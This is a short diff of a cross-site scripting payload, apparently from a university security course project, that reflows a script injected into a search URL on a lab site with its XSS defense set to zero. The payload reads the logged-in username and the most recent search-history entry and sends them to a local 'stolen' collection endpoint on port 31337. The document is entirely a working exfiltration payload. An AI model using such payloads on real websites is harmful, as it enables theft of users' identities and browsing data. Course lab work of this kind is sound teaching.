@@ -3,9 +3,5 @@ http://eecs388.org/project2/search?q=
 <script>
 $(document).ready(
 function(){
-$.get("http://127.0.0.1:31337/stolen?user="
-.concat(document.getElementById("logged-in-user").textContent)
-.concat("%26")
-.concat("last_search=")
-.concat(document.getElementById("history-list").children[1].textContent))})
+$.get("http://127.0.0.1:31337/stolen?user=".concat(document.getElementById("logged-in-user").textContent).concat("%26").concat("last_search=").concat(document.getElementById("history-list").children[1].textContent))})
 </script>&xssdefense=0
